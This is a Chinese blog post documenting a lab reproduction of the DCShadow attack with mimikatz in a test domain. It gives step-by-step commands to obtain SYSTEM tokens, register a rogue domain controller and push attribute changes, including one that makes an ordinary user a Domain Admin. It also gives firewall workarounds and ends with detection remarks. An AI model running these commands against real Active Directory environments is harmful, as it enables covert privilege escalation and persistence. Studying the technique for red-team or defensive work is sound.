---
layout: post
title:  "使用mimikatz执行DCShadow攻击"
date:   2020-12-09
tags: june-1
color: rgb(135,206,235)
cover: '../assets/test.jpg'
subtitle: 'DCShadow创建临时域控'
---

# DCShadow
DCShadow是mimikatz中lsadump模块的新功能。它能模拟域控制器的行为（该攻击使用仅由DC使用的RPC的协议）来注入自己想要的数据，从而绕过包括SIEM在内的大多数常见的安全控件。它与DCSync攻击（已经存在于mimikatz的lsadump模块中）具有某些相似之处。
# 测试环境
DC:Windows server 2012
域：tony.local
![1](/assets/DCShadow/1.png)
域主机:Windows server 2016
已加域
![2](/assets/DCShadow/2.png)
## 涉及到的账户
### 域管理组账户
账户名:test
![3](/assets/DCShadow/3.png)
### 域普通账户
账户名:dc
![4](/assets/DCShadow/4.png)
# 实验流程-1
## 创建窗口A
登录域主机Windows server 2016本地账
![5](/assets/DCShadow/5.png)
### 右键管理员打开权限mimikatz
![6](/assets/DCShadow/6.png)
### 启用system权限
依次执行命令，确保当前的进程已system权限打开
{% highlight ruby %}
mimikatz # !+
[+] 'mimidrv' service already registered
[*] 'mimidrv' service already started

mimikatz # !processtoken
Token from process 0 to process 0
 * from 0 will take SYSTEM token
 * to 0 will take all 'cmd' and 'mimikatz' process
Token from 4/System
 * to 584/cmd.exe
 * to 3968/mimikatz.exe

mimikatz # token::whoami
 * Process Token : {0;000003e7} 1 D 1421627     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 * Thread Token  : no token
{% endhighlight %}
### 窗口Ａ
这个窗口暂时命名为:窗口A
![7](/assets/DCShadow/7.png)
## 开始执行DCShadow
### 查看描述
这里更改dc账户的描述，先查看dc的描述，由于我更改过，所以此时显示为
	“hi,hello”
![8](/assets/DCShadow/8.png)
### 执行更改
在刚才启动的窗口A中执行修改命令，来替换“hi,hello”
{% highlight ruby %}
mimikatz # lsadump::dcshadow /object:CN=dc,CN=Users,DC=tony,DC=local /attribute:description /value:"an attcker"
{% endhighlight %}
执行完后如下所示，等待通过RPC协议推送至域控
![9](/assets/DCShadow/9.png)
## 创建窗口B
保持这个窗口，不要关闭！并在管理员权限下打开另一个cmd窗口，这个窗口的权限必须是域管理组成员的权限，也就是Domain admin组成员。
### 使用PSEXEC
这里使用psexec来启用窗口
![10](/assets/DCShadow/10.png)
### 运行mimikatz
在这个窗口下运行mimikatz,查看当前的权限，为域管理权限test
![11](/assets/DCShadow/11.png)
### 执行推送命令
执行推送命令，下图可以看到，执行完推送命令后，刚开始执行修改的窗口显示RPC server stopped，此时就已经修改完成
{% highlight ruby %}
mimikatz # lsadump::dcshadow /push
{% endhighlight %}
![12](/assets/DCShadow/12.png)
## 查看修改结果
修改成功
![13](/assets/DCShadow/13.png)
# 实验流程-2
将dc账户添加至管理员组(Domain admin)
## 查看描述
首先查看dc的信息
{% highlight ruby %}
PSC:\Users\Administrator> ([adsisearcher]"(&(objectCategory=user)(name=dc))").Findall().Properties
{% endhighlight %}
此时dc的组ID为513
![14](/assets/DCShadow/14.png)
可以参考下面的对应组ID，513为域用户，那想要将dc加入至域管理组，就需要将组ID更改为512
	512   Domain Admins
	513   Domain Users
	514   Domain Guests
	515   Domain Computers
	516   Domain Controllers
## 执行更改
在窗口A中执行
{% highlight ruby %}
mimikatz # lsadump::dcshadow /object:CN=dc,CN=Users,DC=tony,DC=local /attribute:primarygroupid /value:512
{% endhighlight %}
![15](/assets/DCShadow/15.png)
## 执行推送命令
推送至域控制器
![16](/assets/DCShadow/16.png)
## 查看修改结果
查看dc的所属组
![17](/assets/DCShadow/17.png)
![18](/assets/DCShadow/18.png)
# 可能会出现的实验失败情况
在实验过程中，出现推送服务失败的情况，短暂性的卡在如下图的界面，随后出现Performing Unregistration(取消注册)，这里呢，域控之间的通信是通过RPC服务来进行的，执行推送的过程也是需要RPC服务，域控本身RPC服务端口是开放的，但是测试主机的RPC服务端口未开放。所以，有两种解决方法：
1、	把域主机的防火墙关闭
2、	在域主机防火墙中添加策略，开放RPC服务的端口（具体就不再写了，可以自行百度）
![19](/assets/DCShadow/19.png)
![20](/assets/DCShadow/20.png)
6.	总结
DCShadow目前还是具有危害性的操作行为，该技术可以用于更改和删除复制以及其他关联的元数据，以阻止应急人员分析。攻击者还可以利用此技术执行SID历史记录注入和操纵AD对象（例如帐户，访问控制列表等）以建立持久性后门。
这不属于漏洞，因为是使用合法的已记录使用的协议：
	MS-ADTS
	MS-DRSR
这是一种利用后攻击（也称为控制攻击），因为它需要域管理员（或企业管理员）特权。
安全分析人员可以通过流量以及相关的安全日志来查找痕迹。
